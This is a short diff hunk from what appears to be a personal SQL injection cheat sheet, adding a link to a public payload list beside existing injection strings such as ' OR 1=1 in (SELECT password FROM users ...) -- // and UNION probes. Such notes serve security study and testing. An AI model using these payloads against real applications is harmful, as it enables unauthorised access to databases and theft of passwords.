@@ -11,6 +11,7 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 ' OR 1=1 in (SELECT * FROM users) -- //
 ' or 1=1 in (SELECT password FROM users) -- //
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+https://github.com/payloadbox/sql-injection-payload-list
 
 ####### UNION #######
 ' ORDER BY 1-- //
